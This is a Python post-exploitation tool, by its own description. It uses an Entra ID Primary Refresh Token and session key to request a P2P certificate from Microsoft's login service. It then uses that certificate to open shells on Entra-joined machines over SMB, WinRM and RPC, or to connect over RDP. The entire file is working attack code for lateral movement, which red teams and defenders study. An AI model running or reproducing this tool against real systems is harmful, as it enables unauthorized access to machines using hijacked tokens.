import os
import jwt
import json
import base64
import warnings
import requests
import binascii
import argparse
import traceback
from termcolor import colored
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding, hashes, serialization
from cryptography.hazmat.primitives.serialization import pkcs12
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.kbkdf import CounterLocation, KBKDFHMAC, Mode
from impacket.examples.smbclient import MiniImpacketShell
from modules.smb.smbconnection import SMBConnection
from modules.rdp.rdp import RDP
from modules.winrm import WinRM
from modules.rpc import RPC

warnings.filterwarnings("ignore")

def info(msg):
    print(colored(f'[*] {msg}', 'white'))

def error(msg):
    print(colored(f'[-] {msg}', 'red'))

def success(msg):
    print(colored(f'[+] {msg}', 'yellow'))

def debug(msg, debug):
    if debug:
        print(msg)

def base64_urlencode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=')

def base64_urldecode(base64url):
    padding = b'=' * (4 - (len(base64url) % 4))
    return base64.urlsafe_b64decode(base64url + padding)

def get_nonce():
    data = {'grant_type':'srv_challenge'}
    res = requests.post(f'https://login.microsoftonline.com/common/oauth2/token', data=data)
    return res.json()['Nonce']

def generate_csr(common_name):
    from cryptography.hazmat.backends import default_backend
    key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )

    csr_builder = x509.CertificateSigningRequestBuilder().subject_name(x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, common_name),
    ]))

    csr = csr_builder.sign(key, hashes.SHA256(), default_backend())

    private_key_pem = key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    )

    csr_pem = csr.public_bytes(serialization.Encoding.PEM).decode('utf-8')
    csr_body = csr_pem.replace(
        "-----BEGIN CERTIFICATE REQUEST-----", ""
    ).replace(
        "-----END CERTIFICATE REQUEST-----", ""
    ).replace('\n', '')

    return private_key_pem, csr_body

def pem_to_pfx(key_pem, cert_pem, pfx_outpath, password):
    key = serialization.load_pem_private_key(key_pem, password=None)
    cert = x509.load_pem_x509_certificate(cert_pem)
    
    pfx_data = pkcs12.serialize_key_and_certificates(
        name=b"AzureAD-P2PCert",
        key=key,
        cert=cert,
        cas=None,
        encryption_algorithm=serialization.BestAvailableEncryption(password.encode()) if password else serialization.NoEncryption()
    )

    with open(pfx_outpath, 'wb') as f:
        f.write(pfx_data)
    return

def calculate_derived_key_v2(sessionkey, context, jwtbody):
    digest = hashes.Hash(hashes.SHA256())
    digest.update(context)
    digest.update(jwtbody)
    kdfcontext = digest.finalize()
    return calculate_derived_key(sessionkey, kdfcontext)

def calculate_derived_key(sessionkey, context=None):
    label = b"AzureAD-SecureConversation"
    if not context:
        context = os.urandom(24)
    backend = default_backend()
    kdf = KBKDFHMAC(
        algorithm=hashes.SHA256(),
        mode=Mode.CounterMode,
        length=32,
        rlen=4,
        llen=4,
        location=CounterLocation.BeforeFixed,
        label=label,
        context=context,
        fixed=None,
        backend=backend
    )
    derived_key = kdf.derive(sessionkey)
    return context, derived_key

def decrypt_with_session_key(sessionkey, ctx, ciphertext, iv):
    _, derived_key = calculate_derived_key(sessionkey, ctx)
    cipher = Cipher(algorithms.AES(derived_key), modes.CBC(iv))
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    return unpadder.update(decrypted_data) + unpadder.finalize()

def request_p2pcert(prt, sessionkey, pfx_outpath, pfx_password, proxy):
    proxies = None
    if proxy:
        proxies={
            'https':proxy,
            'http':proxy
        }
    try:
        sessionkey = binascii.unhexlify(sessionkey)
        context = os.urandom(24)
        header = {
            'alg':'HS256',
            'ctx':base64.b64encode(context).decode('utf-8'),
            'kdf_ver': 2
        }

        private_key, csr = generate_csr('user@user.com')
        payload = {
            'iss': 'aad:brokerplugin',
            'grant_type': 'refresh_token',
            'aud': 'login.microsoftonline.com',
            'request_nonce': get_nonce(),
            'scope': 'openid aza ugs',
            'refresh_token' : prt,
            'client_id': '38aa3b87-a06d-4817-b275-7a316988d93b',
            'cert_token_use': 'user_cert',
            'csr_type': 'http://schemas.microsoft.com/windows/pki/2009/01/enrollment#PKCS10',
            'csr': csr
        }

        tmpjwt = jwt.encode(payload, context, algorithm='HS256', headers=header)
        jbody = tmpjwt.split('.')[1]
        jwtbody = base64.b64decode(jbody+('='*(len(jbody)%4)))

        _, derived_key = calculate_derived_key_v2(sessionkey, context, jwtbody)
        signed_jwt = jwt.encode(payload, derived_key, algorithm='HS256', headers=header)

        request_data = {
            'grant_type': "urn:ietf:params:oauth:grant-type:jwt-bearer",
            'request': signed_jwt,
            'windows_api_version': '2.2'
        }

        info('requesting P2P cert...')
        response = requests.post(f'https://login.microsoftonline.com/common/oauth2/token', data=request_data, proxies=proxies, verify=False)
        headerdata, enckey, iv, ciphertext, authtag = response.content.decode('utf-8').split('.')
        headers = json.loads(base64_urldecode(headerdata.encode()))
        decrypted_data = decrypt_with_session_key(sessionkey, base64.b64decode(headers['ctx']), base64_urldecode(ciphertext.encode()), base64_urldecode(iv.encode()))
        data = json.loads(decrypted_data.decode())
        cert = f'-----BEGIN CERTIFICATE-----\n{data['x5c']}\n-----END CERTIFICATE-----'

        pem_to_pfx(private_key, cert.encode(), pfx_outpath, pfx_password)
        success('successfully acquired P2P cert!')
        info(f'here is your p2p cert pfx : {pfx_outpath} (pw: {pfx_password})')
    except Exception as e:
        error(f'failed to request P2P cert. check your PRT and session key is valid: \n{e}')

def smbclient(target, pfx, pfxpass):
    try:
        info(f'connecting to {target} via SMB...')
        smbcon = SMBConnection(target, target, sess_port=445)
        if not smbcon.kerberosCertificateLogin(pfx, pfxpass):
            error('failed to login via P2P cert. maybe target doesn\'t support PKU2U authentication or not Entra joinned')
            return
        
        success('sucessfully logged-on to the system!')
        shell = MiniImpacketShell(smbcon, None, None)
        shell.cmdloop()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        error('maybe p2p cert is already expired')
        raise(e)
    return

def rdpclient(target, username, password, pfx, pfxpass):
    info(f'connecting to {target} via RDP...')
    rdpcon = RDP(target, username, password, pfx, pfxpass)
    rdpcon.connect()        
    return

def winrmclient(target, pfx, pfxpass):
    shell = WinRM(target, auth=(None, pfx, pfxpass))
    info(f'connecting to {target} via WinRM...')
    shell.start()
    success('sucessfully logged-on to the system!\n')
    shell.cmd_loop()
    return

def rpcclient(target, pfx, pfxpass):
    shell = RPC(target, pfx, pfxpass)
    info(f'connecting to {target} via RPC...')
    if shell.connect():
        success('sucessfully logged-on to the system!\n')
        shell.start()
    return

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="post-exploitation tool for requesting p2p cert and authenticate with it"
    )
    
    parser.add_argument('--debug', action='store_true',  help='debug option')
    subparsers = parser.add_subparsers(dest="command", required=True, help="Available commands")

    request_parser = subparsers.add_parser("request_p2pcert", help="request P2P cert with PRT and SessionKey")
    request_parser.add_argument("--prt", type=str, required=True, help="Primary Refresh Token (PRT)")
    request_parser.add_argument("--sessionkey", type=str, required=True, help="session Key")
    request_parser.add_argument("--outpfx", type=str, required=False, default='p2pcert.pfx', help="P2P cert pfx name")
    request_parser.add_argument("--outpfxpw", type=str, required=False, default='password', help="P2P cert pfx password")
    request_parser.add_argument("--proxy", type=str, required=False, help="proxy (ex. http://proxy_ip:port)")

    smb_parser = subparsers.add_parser("smb", help="SMB to Entra joinned machine with P2P cert")
    smb_parser.add_argument("--pfx", type=str, required=False, default='p2pcert.pfx', help="P2P cert pfx")
    smb_parser.add_argument("--pfxpw", type=str, required=False, help="password for P2P cert file", default='password')
    smb_parser.add_argument("--target", type=str, required=True, help="target machine's ip address or domain name")

    rdp_parser = subparsers.add_parser("rdp", help="RDP to Entra joinned machine with P2P cert")
    rdp_parser.add_argument("--target", type=str, required=True, help="target machine's ip address or domain name")
    rdp_parser.add_argument("--username", type=str, required=True, help="username (ex. user@test.onmicrosoft.com)")
    rdp_parser.add_argument("--password", type=str, required=True, help="password")
    rdp_parser.add_argument("--pfx", type=str, required=False, default='p2pcert.pfx', help="P2P cert pfx")
    rdp_parser.add_argument("--pfxpw", type=str, required=False, help="password for P2P cert file", default='password')

    winrm_parser = subparsers.add_parser("winrm", help="WinRM to Entra joinned machine with P2P cert")
    winrm_parser.add_argument("--pfx", type=str, required=False, default='p2pcert.pfx', help="P2P cert pfx")
    winrm_parser.add_argument("--pfxpw", type=str, required=False, help="password for P2P cert file", default='password')
    winrm_parser.add_argument("--target", type=str, required=True, help="target machine's ip address or domain name")

    rpc_parser = subparsers.add_parser("rpc", help="RPC to Entra joinned machine with P2P cert")
    rpc_parser.add_argument("--pfx", type=str, required=False, default='p2pcert.pfx', help="P2P cert pfx")
    rpc_parser.add_argument("--pfxpw", type=str, required=False, help="password for P2P cert file", default='password')
    rpc_parser.add_argument("--target", type=str, required=True, help="target machine's ip address or domain name")

    args = parser.parse_args()
    try:
        if args.command == 'request_p2pcert':
            request_p2pcert(args.prt, args.sessionkey, args.outpfx, args.outpfxpw, args.proxy)
        elif args.command == 'smb':
            smbclient(args.target, args.pfx, args.pfxpw)
        elif args.command == 'rdp':
            rdpclient(args.target, args.username, args.password, args.pfx, args.pfxpw)
        elif args.command == 'winrm':
            winrmclient(args.target, args.pfx, args.pfxpw)
        elif args.command == 'rpc':
            rpcclient(args.target, args.pfx, args.pfxpw)
        else:
            error('unknown command')
    except Exception as e:
        error(f'something went wrong:\n{e}')
        if args.debug:
            traceback.print_exc()
        
